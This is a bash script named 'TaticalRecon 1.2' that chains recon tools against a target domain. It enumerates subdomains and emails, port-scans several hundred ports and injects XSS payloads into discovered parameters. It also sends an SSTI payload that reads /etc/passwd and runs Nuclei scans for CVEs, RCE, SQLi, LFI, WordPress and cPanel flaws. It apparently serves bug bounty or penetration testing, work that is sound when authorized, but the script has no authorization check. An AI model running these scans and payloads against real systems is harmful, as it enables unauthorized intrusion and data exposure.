#!/bin/bash

site=$1
ports="21,22,23,25,53,69,88,110,115,123,137,139,143,161,179,194,389,445,465,500,546,547,587,636,993,994,995,1025,1080,1194,1433,1434,1521,1701,1723,1812,1813,2049,2222,2375,2376,3306,3389,3690,4443,5432,5800,5900,5938,5984,6379,6667,6881,8080,8443,8880,9090,9418,9999,10000,11211,15672,27017,28017,3030,33060,4848,5000,5433,5672,6666,8000,8081,8444,8888,8905,9000,9042,9160,9990,11210,12201,15674,18080,1965,1978,2082,2083,2086,2087,2089,2096,22611,25565,27018,28015,33389,4369,49152,54321,54322,55117,55555,55672,5666,5671,6346,6347,6697,6882,6883,6884,6885,6886,6887,6888,6889,8088,8089,9001,9415,17089,27019,34443,3659,45557,55556,5673,5674,6370,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,81,300,591,593,832,981,1010,1311,1099,2095,2480,3000,3128,3333,4242,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,5985,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8083,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8184,8834,8983,9043,9060,9080,9091,9200,9443,9502,9800,9981,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,22222,32400"

function banner {
        clear
        figlet -c -f slant tatical-recon | lolcat
        echo "            Coded By: HunterDep" | lolcat
        echo "            Version: 1.2" | lolcat
        echo "            Command Help: -h" | lolcat
        echo "            Target: $site" | lolcat
        echo
}
banner

if echo $* | grep '\-h' -q;then
        echo "TaticalRecon 1.2: Help"
        echo '-all-apis:      Use -all of subfinder.'
        echo '-th:      Use theHarvesterTool.'
        echo '-gen:      Use DnsGen to Recon.'
        echo '-wilcards:      Recon on Wilcards'
        echo '-urls:      Recon on Urls'
        echo;echo "Scans:"
        echo '-nrich:      CVE Scan on IPS with Nrich'
        echo '-iis-scan:      Find IIS (Windows Server)'
        echo '-firebase-scan:      Find Firebase'
        echo '-js-scan:      Scan JavaScript files with Nuclei'
        echo '-wp-scan:      Recon on WordPress subdomains and vulnerabilities.'
        echo '-cpanel-scan:      Recon on cPanel'
        echo '-nuclei-fuzzer:      Fuzzing on Parameters with Fuzzing-Templates'
        exit;
fi

echo "=====[ Subdomains Recon ]====="
subdominator -d $site -o subs.txt
sublist3r -d $site -n | grep $site | grep -v '[-]' | anew subs.txt
shodanx subdomain -d $site -o shodan-subs.txt ; cat shodan-subs.txt | grep $site | anew subs.txt
echo $site | assetfinder --subs-only | anew subs.txt
findomain -t $site -q | anew subs.txt
echo $site | haktrails subdomains | anew subs.txt
chaos-client -d $site --silent | anew subs.txt
listdomains -d $site --subs --silent | anew subs.txt

cat subs.txt | grep '@' | anew -q emails.txt

if echo $* | grep '\-all-apis' -q;then
        banner
        echo "=====[ Subfinder (APIS) Recon ]====="
        subfinder -d $site --silent -all | anew subs.txt
else
        subfinder -d $site --silent | anew subs.txt
fi
if echo $* | grep '\-th' -q;then
        banner
        echo "=====[ TheHarvester Recon ]====="
        theHarvester -d $site -l 500 -b all -s -f havt
        cat havt.json | jq '."asns".[]' | tr -d '"' | tr ':' '\n' | anew asns.txt
        cat havt.json | jq '."hosts".[]' | tr -d '"' | tr ':' '\n' | grep $site$ | anew subs.txt
        cat havt.json | jq '."emails".[]' | tr -d '"' | tr ':' '\n' | anew emails.txt
fi
if echo $* | grep '\-gen' -q;then
        banner
        echo "=====[ DnsGen Recon ]====="
        echo $site | dnsgen - | anew -q generated-subdomains.txt
        cat generated-subdomains.txt | httpx -t 100 --silent | anew vivos.txt
fi

### NUCLEI SSL NAMES RECON && WILLCARDS ###
banner
echo "====[ SSL Names (Nuclei) ]====="
cat subs.txt | nuclei -t ssl/ssl-dns-names.yaml -c 170 -o nuclei-ssl-names.txt --silent
cat nuclei-ssl-names.txt | awk '{ print $5 }' | tr -d '["]' | tr ',' '\n' | grep $site$ | anew subs.txt
##############################

### WILLCARDS RECON ###
if echo $* | grep '\-wilcards' -q;then
        cat subs.txt | grep '^*.' | sed 's/*\.//' | sed 's/^'$site'//' | anew willcards.txt

        nw=$(cat willcards.txt | wc -l)
        if [[ $nw > 0 ]];then
                banner
                echo "=====[ Wilcards Recon ]====="
                cat willcards.txt | subfinder -o willcards-subs.txt --silent
        fi

        if [[ -f willcards-subs.txt ]];then
                cat willcards-subs.txt | anew subs.txt
        fi
fi
#######################

banner
echo "=====[ IPS Recon ]====="
cat subs.txt | dnsx -a --resp --silent | anew domain_ips.txt
cat domain_ips.txt | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" | awk '{ print $3 }' | tr -d '[]' | anew ips.txt

banner
echo "=====[ PortScan ]====="
naabu -list ips.txt -p $ports -c 150 --silent -o portscan.txt

banner
echo "=====[ Live Targets ]====="
cat subs.txt | grep -v '@' | httpx --silent -t 100 | anew vivos.txt
cat portscan.txt | httpx --silent -t 100 | anew vivos.txt
cat vivos.txt | httpx --silent --title -location -td | anew techs.txt

if echo $* | grep '\-nrich' -q;then
        banner
        echo "=====[ IP Scan With Nrich ]====="
        cat ips.txt | nrich -o json - | anew ips-scan-nrich.txt
fi

if echo $* | grep '\-url' -q;then
        banner
        echo "=====[ URL Recon ]====="
        cat vivos.txt | katana --passive --silent | anew urls.txt
        paramspider -d $site ; cat output/* | anew params.txt
        rm -rf output/

        cat vivos.txt | waybackurls | anew urls.txt
        cat vivos.txt | katana -xhr -jc -fx -kf all --silent | anew urls.txt

        banner
        echo "=====[ Param Recon ]====="
        cat urls.txt | grep '?' | qsreplace 'FUZZ' | anew -q params.txt
        cat params.txt | gf xss | anew -q xss-gf.txt
        cat params.txt | gf sqli | anew -q sqli-gf.txt
        cat params.txt | gf redirect | anew -q redirect-gf.txt
        cat params.txt | gf idor | anew -q idor-gf.txt
        cat params.txt | gf lfi | anew -q lfi-gf.txt
        cat urls.txt | grep '\.js' | grep $site | qsreplace | anew -q js.txt

        cat params.txt | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew airi-xss.txt
        cat params.txt | qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew airi-xss.txt
        cat params.txt | qsreplace '"></script><hTMl/onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew airi-xss.txt
        cat params.txt | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew airi-xss.txt
        cat params.txt | qsreplace 'x" onmouseover=prompt(1447)>' | airixss -p 'prompt(1447)' | egrep -v 'Not' | anew airi-xss.txt

        cat params.txt | qsreplace '{{ 1337*1337 }}' | airixss -p '1787569' | egrep -v 'Not' | anew airi-ssti.txt
        cat params.txt | qsreplace '<%= File.open('/etc/passwd').read %>' | airixss -p ':x:' | egrep -v 'Not' | anew airi-ssti.txt

        cat airi-xss.txt | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" >> vuln-injections.txt
        cat airi-ssti.txt | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" >> vuln-injections.txt
fi

mkdir "Suspects/"
cat subs.txt | grep 'adm\|secret\|confi\|api\|key\|sql\|db\|database\|cash\|dev\|backup\|old\|new\|bank\|add\|edit\|remove\|account' -i | anew Suspects/subs-sus.txt
cat vivos.txt | grep 'adm\|secret\|confi\|api\|key\|sql\|db\|database\|cash\|dev\|backup\|old\|new\|bank\|add\|edit\|remove\|account' -i | anew Suspects/vivos-sus.txt

######################### SCANS ########################################33##################
if echo $* | grep '\-iis-scan' -q;then
        banner
        echo "=====[ IIS Scan ]====="
        nuclei --list vivos.txt -tags iis --output nuclei-iis-scan.txt --silent
fi
if echo $* | grep '\-firebase-scan' -q;then
        banner
        echo "=====[ Firebase Scan ]====="
        nuclei --list vivos.txt -tags firebase --output nuclei-firebase-scan.txt -c 95 --silent
fi
if echo $* | grep '\-js-scan' -q;then
        banner
        echo "=====[ JavaScript Scan ]====="
        nuclei --list js.txt -t http/exposures/tokens --silent -c 95 --output nuclei-api.txt
fi
if echo $* | grep '\-wp-scan' -q;then
        banner
        echo "=====[ WordPress Recon ]====="
        cat vivos.txt | nuclei -t http/technologies/wordpress-detect.yaml --silent -c 75 -o nuclei-wordpress-subs.txt
        echo;echo "=====[ WordPress Vulnerabilities ]====="
        cat nuclei-wordpress-subs.txt | awk '{ print $4 }' | unfurl domains | grep $site | anew | nuclei -tags wordpress,wp-plugin,wp-theme,wpscan,wp --silent -c 80 -o nuclei-wordpress-vulns.txt
fi
if echo $* | grep '\-cpanel-scan';then
        banner
        echo "=====[ cPanel Attacks ]====="
        cat vivos.txt | grep '2082\|2083\|2086\|2087\|2089\|2095\|2096\|cpanel' > cpanel.txt
        nuclei -list cpanel.txt -tags cpanel -c 150 -o nuclei-cpanel.txt --silent
fi
if echo $* | grep '\-nuclei-fuzzer';then
        banner
        echo "=====[ Nuclei Fuzzer ]====="
        nuclei -l params.txt -t dast/ -o nuclei-fuzzer.txt -c 80 --fuzz --silent
fi
############################################################################################

banner
echo "=====[ Nuclei Scan ]====="
mkdir Nuclei-Tests

cat vivos.txt | nuclei -t http/vulnerabilities/generic/ --silent -o nuclei-generic-scan.txt -c 100
cat vivos.txt | nuclei -tags cve,cves,cve2000,cve2001,cve2002,cve2003,cve2004,cve2005,cve2006,cve2007,cve2008,cve2009,cve2010,cve2011,cve2012,cve2013,cve2014,cve2015,cve2016,cve2017,cve2018,cve2019,cve2020,cve2021,cve2022,cve2023,cve2024,cve02024,cnvd -c 125 --silent -o nuclei-cve-scan.txt
cat vivos.txt | nuclei -t ~/nco/nucl-ant/ -t ~/nco/pikpikcu -es info --silent -o nuclei-old-scan.txt -c 85
cat vivos.txt | nuclei -tags exposure,misconfig,config,phpinfo,git,env --silent -o nuclei-exposure-scan.txt -c 150 -es info
cat vivos.txt | nuclei -tags xss,sqli,lfi,ssti,xxe,crlf,rce,redirect -es info --silent -o nuclei-tags.txt -c 150
cat vivos.txt | nuclei -t http/exposed-panels/ --silent -o nuclei-panels.txt -c 90

mv *nuclei* Nuclei-Tests/
echo;echo "[ Recon Finished ]" | lolcat
